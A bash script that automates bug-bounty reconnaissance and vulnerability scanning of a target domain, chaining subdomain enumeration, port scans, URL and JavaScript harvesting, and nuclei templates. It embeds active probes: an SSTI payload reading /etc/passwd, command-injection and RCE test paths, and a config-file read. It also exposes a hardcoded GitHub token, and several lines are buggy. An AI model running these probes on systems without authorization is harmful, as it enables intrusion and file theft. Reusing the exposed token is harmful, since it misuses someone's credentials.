#!/bin/bash

domain=$1
#----------------------------------------
#	Subdomain Enumeration				|
#----------------------------------------
mkdir $domain/
cd $domain
mkdir subdomain 
cd subdomain
subfinder -d $1 -silent -all -o subfinder.txt
findomain-linux -o -t $1 
assetfinder -subs-only $1 | tee assetfinder.txt
sublist3r -d $1 -o sublister.txt
amass enum -passive -norecursive -noalts -d $1 -o amass.txt
python3 ~/ReconTool/censys-subdomain-finder/censys-subdomain-finder.py $1 -o censys-subdomain.txt
# curl -sk "https://crt.sh/?q=$1&output=json" | tr ',' '\n' | awk -F '"' '/common_name/{gsub(/|*\./,"",$4);gsub(/\\n/,"\n",$4);print $4}' | sort -u | tee crt-sh.txt
cat *.txt | sort -u | tee subdomains.txt
cat subdomains.txt | httpx -silent -o hosts.txt
github-subdomains -d $1 -t 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 | tee github-domain.txt
cat subdomains.txt | httpx -silent | aquatone -ports 80 443 8000 8080 8443
gospider -S hosts.txt --js -t 20 -d 2 --sitemap --robots -w -r > some-useful-urls.txt
cat urls.txt | sed '/^.\{2048\}./d' | grep -Eo 'https?://[^ ]+' | sed 's/]$//' | unfurl -u domains | grep ".$1" | tee other-subdomains.txt

# Test:Subdomain-Takeover
cat hosts.txt | nuclei -t ~/FindBug/subdomain-takeover.yaml -o subdomain-takeover.out 
subzy -targets hosts.txt --hide_fails --concurrency 100 | tee subdomain-takeover2.txt 

cd ..
sleep 5
echo "[+] Done Subdomain Enumeration"
#---------------------------------------
#	Gather domain-IPs   				|
#---------------------------------------
mkdir IPs
subfinder -d $1 -all -silent | dnsx -a -resp-only -o IPs/IP-A-Record.txt
cat subdomain/hosts.txt | dnsx -a -resp-only -o IPs/live-ip.txt
cat IPs/*.txt | sort -u | tee IPs/ips.txt
cat subdomain/subdomains.txt | dnsx -a -resp-only | nrich - | tee IPs/nrich.out  
naabu -l subdomain/subdomains.txt -rate 3000 -retries 1 -warm-up-time 0 -c 50 -top-ports 1000 -silent -o IPs/naabu-ports.txt
traceroute $1 | anew IPs/trace-ips.txt
censys search $1 | grep "ip" | egrep -v "description" | cut -d ":" -f2 | tr -d \"\ |tee IPs/censys-ip.txt
shodan search Ssl.cert.subject.CN:"$1" 200 --fields ip_str | httpx -silent | tee IPs/shodan-ip.txt
cat subdomain/subdomains.txt | assetfinder -subs-only | naabu -sa -silent -nc -tp 80 -p 80 443 8080 8443 8090 9000 9001 9002 9003 | aquatone -out aquatone_screenshots
masscan -p1–65535 -iL IPs/ips.txt --max-rate 10000 -oG IPs/masscan.txt
nmap --script default,safe,discovery -p 80,443,8080,8443,9000,9001,9002,9003,8888,8088,8880,3000 -n -T4 -iL IPs/ips.txt -oN nmap.out 

sleep 5
echo "[+] Done IPs Enumeration"
#-----------------------------------------------
#  Gathering Wayback URLs + GauPlus 			|
#------------------------------------------------
mkdir URLs 	
cat subdomain/hosts.txt | waybackurls | sort -u | uro | httpx -silent | tee URLs/waybackurls.txt
cat subdomain/hosts.txt | gauplus | sort -u | uro | httpx -silent | tee URLs/Gauplus.txt
cat URLs/*.txt | sort -u | uro | tee URLs/urls.txt

python3 ~/ReconTool/ParamSpider/paramspider.py -d $1 --exclude woff,.css,.js,.png,.svg,.php,.jpg

sleep 5
echo "[+] Done Crawlling: Wayback + Gauplus + ParamSpider "
#-------------------------------------------------
#	 				GF-Pattern					 |
#-------------------------------------------------
mkdir GF-Pattern
cat URLs/urls.txt | grep "=http" | sort -u | tee GF-Pattern/redirect.txt
cat URLs/urls.txt | gf xss | sort -u | tee GF-Pattern/xss.txt 
cat URLs/urls.txt | gf sqli | sort -u | tee GF-Pattern/sqli.txt
cat URLs/urls.txt | gf ssrf | sort -u | tee GF-Pattern/ssrf.txt
cat URLs/urls.txt | gf lfi | sort -u | tee GF-Pattern/lfi.txt
cat URLs/urls.txt | gf idor | sort -u | tee GF-Pattern/idor.txt
cat URLs/urls.txt | gf rce | sort -u | tee GF-Pattern/rce.txt
cat URLs/urls.txt | gf ssti | sort -u | tee GF-Pattern/ssti.txt
cat URLs/ssti.txt |  qsreplace "{{''.class.mro[2].subclasses()[40]('/etc/passwd').read()}}" | parallel -j50 -q curl -g | grep  "root:x" | tee ssti-result.txt

sleep 5
echo "[+] Done GF-Pattern "
#----------------------------------------------------
# 				Gather-JS File 						|							
#----------------------------------------------------
mkdir JS-FILE
cd JS-FILE
echo $1 | gauplus | grep '\.js$' | httpx -status-code -mc 200 -silent | grep 'application/javascript' | tee jsfile1.txt
assetfinder $1 | gau|egrep -v '(.css|.png|.jpeg|.jpg|.svg|.gif|.wolf)' | grep ".*\.js" | tee jsfile2.txt
gau --subs $1 | grep ".js$" | tee jsfile.txt
subfinder -d $1 -silent | waybackurls | grep ".js$" | tee jsfile3.txt
subfinder -d $1 -silent | httpx -silent | subjs | tee jsfile4.txt
#Noted: Spider the host on burp and copy all the js file link from burp also so that you won’t miss any js file and paste it into jsfile.txt file
cat *.txt | sort -u | tee final-js.txt
cat final-js.txt | xargs -I% bash -c 'curl -sk "%" | grep -w "*.s3.amazonaws.com"' | tee s3_bucket.txt
cat final-js.txt| xargs -I% bash -c 'curl -sk "%" | grep -w "*.s3.us-east-2.amazonaws.com"' | tee s3_bucket.txt
cat final-js.txt | xargs -I% bash -c 'curl -sk "%" | grep -w "s3.amazonaws.com/*"' | tee s3_bucket.txt
cat final-js.txt |  xargs -I% bash -c 'curl -sk "%" | grep -w "s3.us-east-2.amazonaws.com/*"' | tee s3_bucket.txt 
#we have all the s3 aws bucket url then we will collect the s3 buck name
cat s3_bucket.txt | sed 's/s3.amazonaws.com//' >> bucket_name.txt
cat s3_bucket.txt | sed 's/s3.us-east-2.amazonaws.com//' >> bucket_name.txt
# https://medium.com/@notifybugme/how-i-was-able-find-mass-leaked-aws-s3-bucket-from-js-file-6064a5c247f8 --> For further read 
cd ..

sleep 5
echo "[+] Done JS File Enumeration"
#-----------------------------------------------
#		Technology - Tech Detech 				|
#-----------------------------------------------
mkdir Technologies
https -l subdomain/hosts.txt -threads 100 -match-string 'Moment.js' -o Technologies/Moment.txt
https -l subdomain/hosts.txt -threads 100 -match-string 'wordpress' -o Technologies/wordpress.txt
https -l subdomain/hosts.txt -threads 100 -match-string 'Elementor' -o Technologies/Elementor.txt
https -l subdomain/hosts.txt -threads 100 -match-string 'grafana' -o Technologies/grafana.txt
https -l subdomain/hosts.txt -threads 100 -match-string 'confluence' -o Technologies/confluence.txt
https -l subdomain/hosts.txt -threads 100 -match-string 'jira' -o Technologies/jira.txt
https -l subdomain/hosts.txt -threads 100 -match-string 'zimbra' -o Technologies/zimbra.txt
httpx -l subdomain/hosts.txt -threads 100 -match-string 'VMware' -o Technologies/wmware.txt
httpx -l subdomain/hosts.txt -threads 100 -match-string 'Elasticsearch' -o Technologies/Elasticsearch.txt
httpx -l subdomain/hosts.txt -threads 100 -match-string 'springcloud' -o Technologies/springcloud.txt

sleep 5
echo "[+] Done Technologies Detect"
#------------------------------------------------
# 				Nuclie Scan						| 
#------------------------------------------------
mkdir Nuclie
# cat subdomain/hosts.txt | nuclei -t ~/nuclei-templates -severity critical,high,medium,low -c 500 --bulk-size 500 -o Nuclie/nuclei.out
nuclei -l subdomain/hosts.txt -t ~/FindBug/TP5_Arbitrary_file_read.yaml -o Nuclie/arbitary-fileread.out
# cat subdomain/hosts.txt | assetfinder -subs-only | httpx -silent -p 80 443 8080 8443 9000 9001 9002 9003 -nc  | nuclei -t ~/nuclei-templates/ --severity critical high medium low -silent -o Nuclie/nuclei.txt
rustscan -a IPs/ips.txt -r 1-65535 | grep 'Open' | tee Nuclie/open-ports.txt | sed 's/Open//' | httpx -silent | nuclei -t ~/nuclei-templates -o Nuclie/rustscan-result.out
nuclei -l subdomain/hosts.txt -t ~/FindBug/Host-header-injection.yaml -o host-header.out 
nuclei -l subdomain/hosts.txt -t ~/FindBug/CVE-2022-30525-initial-detect.yaml -o Zyxel-RCE.out 
nuclei -l subdomain/hosts.txt -t ~/FindBug/web-cache.yaml -o webcache.out 
nuclei -l subdomain/hosts.txt -t ~/FindBug/User-Agent-XSS.yaml
nuclei -l Technologies/wordpress.txt -tags wordpress ~/nuclei-templates -o Nuclie/wordpress.out 
nuclei -l subdomain/hosts.txt -t ~/FindBug/graphql-OFJAAAH.yaml -o Nuclie/grapql.out 

sleep 5
echo "[+] Done Nuclie Scan "
#-------------------------------------------------
#		Other Scan 								 |
#-------------------------------------------------
crlfuzz -l subdomain/hosts.txt -o crlf.txt
cat subdomain/hosts.txt | httpx -path "/cgi-bin/admin.cgi?Command=sysCommand&Cmd=id" -nc -ports 80 443 8080 8443 -mr "uid=" -silent -o os-injection.out
httpx subdomain/hosts.txt -path "/_fragment?_path=_controller=phpcredits&flag=-1" -threads 100 -random-agent -x GET  -tech-detect -status-code  -follow-redirects -title -mc 200 -match-regex "PHP Credits" -o RCE.out
cat subdomain/hosts.txt | httpx -nc -t 300 -p 80,443,8080,8443 -silent -path "/s/123cfx/_/;/WEB-INF/classes/seraph-config.xml" -mc 200 -o attlassian.txt
nuclei -l subdomain/hosts.txt -tags aem -t ~/nuclei-templates -vv -o aem.out 
python3 ~/ReconTool/SQLiDetector/sqlidetector.py -f GF-Pattern/sqli.txt -w 50 -o sqli-ouput.txt
cat GF-Pattern/sqli.txt | sed 's/=.*/=/' | nuclei -t ~/FindBug/sqli.yaml -o sqli-detect.out

sleep 5
echo "[+] Done Recon :) Happy Hacking"

